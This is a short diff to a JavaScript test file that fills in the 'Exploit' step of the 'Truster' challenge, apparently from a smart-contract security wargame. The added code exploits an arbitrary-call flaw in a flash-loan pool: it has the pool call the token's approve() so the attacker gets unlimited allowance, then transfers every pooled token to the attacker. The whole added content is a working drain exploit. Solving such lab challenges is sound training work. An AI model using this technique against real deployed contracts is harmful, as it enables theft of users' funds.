@@ -29,6 +29,20 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // we can call ERC20.approve() from inside the pool and then withdraw later
+
+        await this.pool.flashLoan(
+            TOKENS_IN_POOL,
+            this.pool.address,
+            this.token.address,
+            this.token.interface.encodeFunctionData(
+                "approve",
+                [attacker.address, ethers.constants.MaxUint256]
+            )
+        );
+        await this.token
+            .connect(attacker)
+            .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
